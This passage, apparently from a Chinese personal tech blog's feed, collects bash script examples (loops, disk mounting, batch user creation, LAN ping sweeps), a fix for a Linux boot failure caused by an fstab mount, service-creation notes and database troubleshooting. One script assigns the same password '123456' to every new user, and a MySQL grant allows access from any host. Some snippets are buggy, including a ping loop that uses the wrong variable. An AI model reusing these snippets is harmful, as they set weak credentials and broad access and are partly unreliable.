punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>     <span class="token builtin class-name">echo</span> <span class="token string">"good  job!"</span><span class="token keyword">else</span>     <span class="token builtin class-name">echo</span> <span class="token string">"input  score is wrong , the range is [0-100]!"</span><span class="token keyword">fi</span><span class="token comment">##15.这个脚本在每个星期天由cron来执行。如果星期的数是偶数，他就提醒你把垃圾箱清理：</span><span class="token comment">#!/bin/bash</span><span class="token assign-left variable">WEEKOFFSET</span><span class="token operator">=</span>$<span class="token punctuation">[</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +<span class="token string">"%V"</span><span class="token variable">)</span></span> % <span class="token number">2</span> <span class="token punctuation">]</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$WEEKOFFSET</span> -eq <span class="token string">"0"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>   <span class="token builtin class-name">echo</span> <span class="token string">"Sunday evening, put out the garbage cans."</span> <span class="token operator">|</span> mail -s <span class="token string">"Garbage cans out"</span>  your@your_domain.com<span class="token keyword">fi</span><span class="token comment">##16.挂载硬盘脚本(windows下的ntfs格式硬盘)</span><span class="token comment">#! /bin/sh</span><span class="token assign-left variable">dir_d</span><span class="token operator">=</span>/media/disk_d<span class="token assign-left variable">dir_e</span><span class="token operator">=</span>/media/disk_e<span class="token assign-left variable">dir_f</span><span class="token operator">=</span>/media/disk_f<span class="token assign-left variable">a</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> $dir_d <span class="token operator">|</span> <span class="token function">wc</span> -l<span class="token variable">`</span></span><span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> $dir_e <span class="token operator">|</span> <span class="token function">wc</span> -l<span class="token variable">`</span></span><span class="token assign-left variable">c</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> $dir_f <span class="token operator">|</span> <span class="token function">wc</span> -l<span class="token variable">`</span></span><span class="token builtin class-name">echo</span> <span class="token string">"checking disk_d..."</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$a</span> -eq <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"disk_d  is not exsit,now creating..."</span>    <span class="token function">sudo</span>  <span class="token function">mount</span> -t ntfs /dev/disk/by-label/software /media/disk_d<span class="token keyword">else</span>    <span class="token builtin class-name">echo</span> <span class="token string">"disk_d exits"</span><span class="token keyword">fi</span><span class="token builtin class-name">echo</span>  <span class="token string">"checking  disk_e..."</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$b</span> -eq <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"disk_e is not exsit,now creating..."</span>    <span class="token function">sudo</span> <span class="token function">mount</span> -t ntfs /dev/disk/by-label/elitor /media/disk_e<span class="token keyword">else</span>    <span class="token builtin class-name">echo</span>  <span class="token string">"disk_e exits"</span><span class="token keyword">fi</span><span class="token builtin class-name">echo</span>  <span class="token string">"checking  disk_f..."</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$c</span> -eq <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span>  <span class="token string">"disk_f  is not exsit,now creating..."</span>    <span class="token function">sudo</span> <span class="token function">mount</span> -t ntfs /dev/disk/by-label/work /media/disk_f<span class="token keyword">else</span>    <span class="token builtin class-name">echo</span> <span class="token string">"disk_f  exits"</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-循环-迭代"><a href="#4-循环-迭代" class="headerlink" title="4.循环/迭代"></a>4.循环/迭代</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">##for i in 的各种用法 ：</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> “file1” “file2” “file3”<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> /boot/*<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> /etc/*.conf<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">seq</span> -w <span class="token number">10</span><span class="token variable">)</span></span> --<span class="token operator">&gt;</span>等宽的01-10<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token punctuation">{</span><span class="token number">1</span>…10<span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span> <span class="token function">ls</span> <span class="token variable">)</span></span><span class="token keyword">for</span> <span class="token for-or-select variable">I</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token operator">&lt;</span> <span class="token function">file</span><span class="token variable">)</span></span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> “<span class="token variable">$@</span>” --<span class="token operator">&gt;</span>取所有位置参数，可简写为for i<span class="token comment">#注意：bash shell支持C式for循环</span><span class="token comment">##产生十个随机数：</span><span class="token comment">#方法1：</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">..</span><span class="token number">9</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token builtin class-name">echo</span> <span class="token environment constant">$RANDOM</span><span class="token punctuation">;</span><span class="token keyword">done</span>方法2：<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">seq</span> <span class="token number">10</span><span class="token variable">)</span></span><span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token builtin class-name">echo</span> <span class="token environment constant">$RANDOM</span><span class="token punctuation">;</span><span class="token keyword">done</span><span class="token comment">##倒数五秒：</span><span class="token comment">#方法1</span><span class="token comment">#!/bin/bash</span><span class="token builtin class-name">echo</span> <span class="token string">"准备倒数5秒："</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">seq</span> <span class="token number">5</span> -1 <span class="token number">1</span><span class="token variable">)</span></span><span class="token keyword">do</span>    <span class="token builtin class-name">echo</span> -en <span class="token string">"<span class="token variable">$i</span>"</span><span class="token punctuation">;</span><span class="token function">sleep</span> <span class="token number">1</span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> -e <span class="token string">"开始"</span><span class="token comment">#方法2：</span><span class="token comment">#!/bin/bash</span><span class="token builtin class-name">echo</span> <span class="token string">"准备倒数5秒："</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">seq</span> <span class="token number">5</span> -1 <span class="token number">1</span><span class="token variable">)</span></span><span class="token keyword">do</span>    <span class="token builtin class-name">echo</span> -en <span class="token string">"<span class="token entity" title="\b">\b</span><span class="token variable">$i</span>"</span><span class="token punctuation">;</span><span class="token function">sleep</span> <span class="token number">1</span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token entity" title="\b">\b</span>开始"</span><span class="token comment">##批量添加用户：</span><span class="token comment">#!/bin/bash</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /root/users.txt<span class="token variable">)</span></span>        --<span class="token operator">&gt;</span>从列表文件读取文件名<span class="token keyword">do</span>    <span class="token function">useradd</span> <span class="token variable">$i</span>    <span class="token builtin class-name">echo</span> <span class="token string">"123456"</span> <span class="token operator">|</span> <span class="token function">passwd</span> --stdin <span class="token variable">$i</span> --<span class="token operator">&gt;</span>通过管道指定密码字串<span class="token keyword">done</span><span class="token comment">##查找出uid大于10000的用户，然后删除，必须使用for循环。</span><span class="token comment">#方法1</span><span class="token comment">#!/bin/bash</span><span class="token assign-left variable">u_uid</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> /etc/passwd <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print $3}'</span><span class="token variable">`</span></span><span class="token punctuation">)</span><span class="token assign-left variable">u_name</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> /etc/passwd <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print $1}'</span><span class="token variable">`</span></span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span>  <span class="token variable"><span class="token variable">`</span><span class="token function">seq</span> $<span class="token punctuation">{</span>#u_uid<span class="token punctuation">[</span>@<span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token variable">`</span></span><span class="token keyword">do</span>    <span class="token keyword">if</span> <span class="token variable"><span class="token punctuation">((</span>  ${u_uid[i<span class="token operator">-</span><span class="token number">1</span>]} <span class="token operator">&gt;</span> <span class="token number">10000</span>  <span class="token punctuation">))</span></span>    <span class="token keyword">then</span>           <span class="token function">userdel</span> -r  <span class="token variable">${u_name<span class="token punctuation">[</span>i-1<span class="token punctuation">]</span>}</span><span class="token operator">&amp;&amp;</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">${u_name<span class="token punctuation">[</span>i-1<span class="token punctuation">]</span>}</span> delete ok"</span>    <span class="token keyword">fi</span><span class="token keyword">done</span><span class="token comment">#方法2用正则找出大于10000的用户：</span><span class="token function">cat</span> /etc/passwd <span class="token operator">|</span> <span class="token function">egrep</span> “1<span class="token punctuation">[</span><span class="token number">0</span>-9<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">2</span>-9<span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">5</span>,<span class="token punctuation">}</span>”<span class="token comment">##输出</span><span class="token comment">#$1 is aa,</span><span class="token comment">#$2 is bb,</span><span class="token comment">#$3 is cc,</span><span class="token comment">#$4 is dd,</span><span class="token comment">#$5 is ee</span><span class="token comment">#答案：</span><span class="token comment">#!/bin/bash</span><span class="token builtin class-name">echo</span> <span class="token string">"there are <span class="token variable">$#</span> arguments in this scripts"</span><span class="token assign-left variable">N</span><span class="token operator">=</span><span class="token number">1</span>  --<span class="token operator">&gt;</span>变量N用来计数<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable">$@</span><span class="token keyword">do</span>    <span class="token builtin class-name">echo</span> <span class="token string">"\<span class="token variable">$$</span>N is <span class="token variable">$i</span>"</span>    <span class="token variable"><span class="token punctuation">((</span>N<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token keyword">done</span><span class="token comment">##ping 命令</span>-c <span class="token number">1</span> —<span class="token operator">&gt;</span>只ping一次。-i <span class="token number">0.2</span>–<span class="token operator">&gt;</span>第一个包和第二个包之间间隔0.2s-w <span class="token number">2</span> --<span class="token operator">&gt;</span>只等待2s<span class="token comment">#例：</span><span class="token function">ping</span> <span class="token number">172.30</span>.132.123 <span class="token operator">&amp;&gt;</span>/dev/null <span class="token comment">#重定向对于ping命令无用，执行成功$?就返回0，不成功则返回1</span><span class="token comment">#根据IP地址检查网络中存活的主机IP(大范围的扫描)</span><span class="token comment">#!/bin/bash</span><span class="token keyword">for</span> <span class="token for-or-select variable">r</span> <span class="token keyword">in</span> <span class="token number">192.168</span>.1.<span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token number">254</span><span class="token punctuation">}</span><span class="token keyword">do</span>    <span class="token function">ping</span> -c1 -w1 <span class="token string">"<span class="token variable">${ip}</span>"</span> <span class="token operator">&amp;&gt;</span>/dev/null<span class="token keyword">done</span>arp -n<span class="token operator">|</span><span class="token function">grep</span> ether<span class="token operator">|</span><span class="token function">tr</span> -s <span class="token string">' '</span><span class="token operator">|</span><span class="token function">cut</span> -d<span class="token string">' '</span> -f1<span class="token comment">##关于ping命令的一个最经典的脚本：</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token number">193</span><span class="token punctuation">}</span><span class="token keyword">do</span>    <span class="token punctuation">(</span> <span class="token function">ping</span> -c1 -i0.2 -w1 <span class="token number">172.16</span>.30.<span class="token variable">$i</span> <span class="token operator">&amp;&gt;</span>/dev/null    <span class="token keyword">if</span> <span class="token variable"><span class="token punctuation">((</span>  $<span class="token operator">?</span><span class="token operator">==</span><span class="token number">0</span>  <span class="token punctuation">))</span></span>    <span class="token keyword">then</span>            <span class="token builtin class-name">echo</span> <span class="token string">"172.16.30.<span class="token variable">$i</span> up"</span>    <span class="token operator">&gt;&gt;</span><span class="token number">2</span>.txt    <span class="token keyword">else</span>            <span class="token builtin class-name">echo</span> <span class="token string">"172.16.30.<span class="token variable">$i</span> down"</span>    <span class="token operator">&gt;&gt;</span><span class="token number">3</span>.txt    <span class="token keyword">fi</span> <span class="token punctuation">)</span><span class="token operator">&amp;</span>    --<span class="token operator">&gt;</span>这样就把这一段放到后台去执行了，大大加快了速度。<span class="token keyword">done</span><span class="token function">sleep</span> <span class="token number">2</span><span class="token assign-left variable">live_pc_num</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> <span class="token number">2</span>.txt<span class="token operator">|</span><span class="token function">wc</span> -l<span class="token variable">`</span></span><span class="token assign-left variable">down_pc_num</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> <span class="token number">3</span>.txt<span class="token operator">|</span><span class="token function">wc</span> -l<span class="token variable">`</span></span><span class="token builtin class-name">echo</span> <span class="token string">"there are <span class="token variable">$down_pc_num</span> is down"</span><span class="token builtin class-name">echo</span> <span class="token string">"there are <span class="token variable">$live_pc_num</span> is up"</span><span class="token builtin class-name">echo</span> <span class="token string">"list:"</span><span class="token function">cat</span> <span class="token number">2</span>.txt<span class="token function">rm</span> -rf <span class="token number">2</span>.txt <span class="token number">3</span>.txt<span class="token comment">##典型的while循环：</span><span class="token comment">#!/bin/bash</span><span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token keyword">while</span> <span class="token builtin class-name">:</span>    --<span class="token operator">&gt;</span>:等价为true<span class="token keyword">do</span>  <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$i</span>"</span>  <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">++</span><span class="token punctuation">))</span></span>  <span class="token function">sleep</span> <span class="token number">0.3</span><span class="token keyword">done</span><span class="token comment">#注：这是个死循环，会一直执行下去</span><span class="token comment">#加上break，可以跳出循环：</span><span class="token comment">#!/bin/bash</span><span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token keyword">while</span> <span class="token builtin class-name">:</span><span class="token keyword">do</span>  <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$i</span>"</span>  <span class="token variable"><span class="token punctuation">((</span>  i<span class="token operator">++</span>  <span class="token punctuation">))</span></span>  <span class="token keyword">if</span> <span class="token variable"><span class="token punctuation">((</span>   i<span class="token operator">==</span><span class="token number">20000</span>  <span class="token punctuation">))</span></span>  --<span class="token operator">&gt;</span>输出的只有1-19999  <span class="token keyword">then</span>  <span class="token builtin class-name">break</span>  <span class="token keyword">fi</span><span class="token keyword">done</span><span class="token comment">##小结:</span><span class="token comment">#break：跳出整个循环</span><span class="token comment">#exit：跳出脚本</span><span class="token comment">#continue：跳出本次循环，接着执行下一次循环</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>自动挂载导致的linux无法正常启动,报错：&#39; dependency failed for /data , dependency failed for local file systems&#39;</title>
      <link href="/2021/04/25/yuque/zukqr5/"/>
      <url>/2021/04/25/yuque/zukqr5/</url>
      
        <content type="html"><![CDATA[<h2 id="情景再现："><a href="#情景再现：" class="headerlink" title="情景再现："></a>情景再现：</h2><blockquote><p>1.昨天换高压线全村停电一天，来电后发现我 N1 上的服务都无法访问了，就想 ssh 连上看看情况，结果 ssh 也连不上，22 端口不通，ping 测试是通的。</p></blockquote><blockquote><p>2.然后就接上显示器看到一只在找 dev-sda1.device 这个设备，1min30s 后超时没找到；不对呀，硬盘好好的在上面插着呢。如下图：</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/264343/1619346510932-92b300bb-9d17-4414-8524-03c536bfbcfe.jpeg#height=3024&amp;id=PvTOv&amp;margin=%5Bobject%20Object%5D&amp;name=E368716A-B15A-4115-962C-6721506FF2E6.jpeg&amp;originHeight=3024&amp;originWidth=4032&amp;originalType=binary&amp;size=4161041&amp;status=done&amp;style=none&amp;width=4032" alt="E368716A-B15A-4115-962C-6721506FF2E6.jpeg"></p><blockquote><p>3.按照提示输入 root 用户的密码后成功进入了终端，然后提示<code>zsh: locking failed for /root/.zsh_history: read-only file system: reading anyway</code>,发现不知这一个文件成只读了，很多文件都是；查找资料得知，这是意外断电导致 linux 进入的保护模式，防止进一步损坏。使用<code>mount -o remount,rw /</code>命令即可读写，不会造成任何影响。然后执行<code>systemctl reboot</code>重启系统，还是老样子并没有解决。</p></blockquote><blockquote><p>4.然后我就盯上了黄色的警告<code>dependency failed for /data</code>,查询资料发现就是硬盘导致的挂载失败。<br>执行<code>vi /etc/fstab</code>查看配置，发现里面最后一行之前配置的 sda 挂载到了/data,把这一行注释之后再重启，最终解决了问题。</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>创建系统服务</title>
      <link href="/2021/04/01/yuque/gbrhn4/"/>
      <url>/2021/04/01/yuque/gbrhn4/</url>
      
        <content type="html"><![CDATA[<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">### sc 系统自带(有些程序可能无法正常启动),等号后面的空格不要去掉</span><span class="token comment">## 创建服务 sc create 服务名 参数</span>sc create nginx <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">"D:\Serenity\dev-tools<span class="token entity" title="\n">\n</span>ginx<span class="token entity" title="\n">\n</span>ginx.exe -p <span class="token entity" title="\&quot;">\"</span>D:/Serenity/dev-tools/nginx<span class="token entity" title="\&quot;">\"</span>"</span> <span class="token assign-left variable">type</span><span class="token operator">=</span> own <span class="token assign-left variable">start</span><span class="token operator">=</span> auto <span class="token assign-left variable">displayname</span><span class="token operator">=</span> nginx服务<span class="token comment">## 删除服务 sc delete 服务名</span>sc delete nginx<span class="token comment">### winsw 可以通过xml配置启动时和关闭时传递的参数,一直在更新,已经支持yml配置</span><span class="token comment">## 地址:https://github.com/winsw/winsw</span><span class="token comment">### nssm 好久没有更新了, 最新是2017年的测试版</span><span class="token comment">##地址:http://nssm.cc/</span><span class="token comment">### srvany 微软提供的软件,通过注册表进行配置</span><span class="token comment">##</span><span class="token comment">### SrvanyUI 基于srvany的界面配置工具</span><span class="token comment">## https://wangye.org/blog/archives/644/</span><span class="token comment">### 服务管理</span>net start<span class="token operator">|</span>stop 服务名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#*.service 配置文件可以的存放位置:</span><span class="token comment">#/etc/systemd/system/</span><span class="token comment">#/lib/systemd/system/</span><span class="token comment">#服务文件编写示例</span><span class="token comment">#参考:https://blog.csdn.net/huahuajjh/article/details/55506698</span><span class="token punctuation">[</span>Unit<span class="token punctuation">]</span><span class="token assign-left variable">Description</span><span class="token operator">=</span>功能描述<span class="token assign-left variable">Wants</span><span class="token operator">=</span>network-online.target <span class="token comment"># 该软件包应在wants目录中的等待服务上安装一个符号链接，network-online.target以便希望等待已配置网络的服务将其引入。</span><span class="token assign-left variable">After</span><span class="token operator">=</span>network.target network-online.target <span class="token comment">#等待守护程序完成的服务应在特定服务之后和之前对其进行订购network-online.target。它应该Requisite在守护程序服务上使用，以便在不使用相应的网络管理服务的情况下立即失败。</span><span class="token punctuation">[</span>Service<span class="token punctuation">]</span><span class="token assign-left variable">Type</span><span class="token operator">=</span>forking <span class="token comment">#后台运行模式</span><span class="token assign-left variable">PIDFILE</span><span class="token operator">=</span>/var/run/redis_6379.pid <span class="token comment">#存放PID文件的位置</span><span class="token assign-left variable">ExecStart</span><span class="token operator">=</span>/usr/local/redis/bin/redis-server /usr/local/redis/redis.conf <span class="token comment">#这是服务运行的具体执行命令</span><span class="token assign-left variable">ExecReload</span><span class="token operator">=</span>/usr/local/redis/bin/redis-server -s reload  <span class="token comment">#这是服务重启的执行命令</span><span class="token assign-left variable">ExecStop</span><span class="token operator">=</span>/usr/local/redis/bin/redis-cli -h <span class="token number">192.168</span>.56.100 -p <span class="token number">6379</span> <span class="token function">shutdown</span>  <span class="token comment">#这是服务停止的执行命令</span><span class="token assign-left variable">Restart</span><span class="token operator">=</span>always <span class="token comment">#这个选项如果被允许，服务重启的时候进程会退出，会通过 systemctl 命令执行清除并重启的操作。</span><span class="token comment">#ExecStop=/bin/kill -HUP $MAINPID #这是服务停止的执行命令</span><span class="token assign-left variable">PrivateTmp</span><span class="token operator">=</span>true <span class="token comment">#True 表示给服务分配独立的临时空间</span><span class="token punctuation">[</span>Install<span class="token punctuation">]</span><span class="token assign-left variable">WantedBy</span><span class="token operator">=</span>multi-user.target<span class="token comment">#Service的启动方式，在Service段中，启动方式使用Type指定。具体可以参考:</span><span class="token function">man</span> systemd.service<span class="token comment">#值得注意的是，在脚本中关于服务启动、重启、关闭的指令需要使用绝对路径，否则会出现无法识别的情况。</span><span class="token comment">#当完成一个服务脚本后，</span><span class="token comment">#我们就可以使用 `systemctl start|stop|restart|status xxx.service` 等指令了。</span><span class="token comment">#若要开机启动这个服务我们使用如下的指令：</span>systemctl <span class="token builtin class-name">enable</span> xxx.service<span class="token comment">#若要关闭开机启动:</span>systemctl disable xxx.service<span class="token comment">#当我们需要查看服务信息的使用可以使用如下指令,列出正在运行的服务：</span>systemctl list-units --type<span class="token operator">=</span>service<span class="token comment">#在service片段中有几个概念很重要，这直接影响到实践中创建自定义服务的最终结果。</span><span class="token comment">#以下内容根据linux系统中 `man systemd.service` 用户手册说明经过翻译和整理而得。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数据库问题汇总</title>
      <link href="/2021/03/26/yuque/vyo502/"/>
      <url>/2021/03/26/yuque/vyo502/</url>
      
        <content type="html"><![CDATA[<h2 id="记一次-pgsql-数据库连接数超出，导致服务无法正常访问的问题"><a href="#记一次-pgsql-数据库连接数超出，导致服务无法正常访问的问题" class="headerlink" title="记一次 pgsql 数据库连接数超出，导致服务无法正常访问的问题"></a>记一次 pgsql 数据库连接数超出，导致服务无法正常访问的问题</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--- 显示设置的最大连接数</span><span class="token keyword">show</span> max_connections<span class="token punctuation">;</span><span class="token comment">-- 根据用户名显示连接数</span><span class="token keyword">select</span> usename<span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> pg_stat_activity <span class="token keyword">group</span> <span class="token keyword">by</span> usename <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">desc</span><span class="token punctuation">;</span><span class="token comment">-- 当前存活的连接数</span><span class="token keyword">SELECT</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> pg_stat_activity <span class="token keyword">WHERE</span> <span class="token operator">NOT</span> pid<span class="token operator">=</span>pg_backend_pid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> pg_stat_activity<span class="token punctuation">;</span><span class="token comment">-- 显示客户端连接数</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> pg_stat_activity<span class="token punctuation">;</span><span class="token comment">-- 删除空闲连接数</span><span class="token keyword">SELECT</span> pg_terminate_backend<span class="token punctuation">(</span>pid<span class="token punctuation">)</span> <span class="token keyword">FROM</span> pg_stat_activity <span class="token keyword">WHERE</span> state<span class="token operator">=</span><span class="token string">'idle'</span><span class="token comment">------------ 解决方案：在postgresql.conf中设置（默认为100修改大一些即可）：</span><span class="token comment">-- max_connections = 1000</span><span class="token comment">-- 这样并没解决根本问题（导致连接数量增加，或是连接一直没有被释放。）</span><span class="token comment">-- 原因可能是程序连接池 分配初始连接数过多。</span><span class="token comment">-- 可以为每个平台系统分配不同的用户，根据用户占用的连接数分析出是哪个系统的原因，再具体分析原因。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="MySQL-MariaDb-开启远程连接（解决：Host-xxx-is-not-allowed-to-connect-to-this-MariaDb-server）"><a href="#MySQL-MariaDb-开启远程连接（解决：Host-xxx-is-not-allowed-to-connect-to-this-MariaDb-server）" class="headerlink" title="MySQL/MariaDb 开启远程连接（解决：Host xxx is not allowed to connect to this MariaDb server）"></a>MySQL/MariaDb 开启远程连接（解决：Host xxx is not allowed to connect to this MariaDb server）</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">------ 1.授权法（推荐）</span><span class="token comment">-- %:表示从任何主机连接到mysql服务器，如果想允许指定ip，把%替换成对应的ip即可。</span><span class="token comment">-- user:要进行授权的用户名</span><span class="token comment">-- password:用户以后登录用的密码</span><span class="token keyword">GRANT</span> <span class="token keyword">ALL</span> <span class="token keyword">PRIVILEGES</span> <span 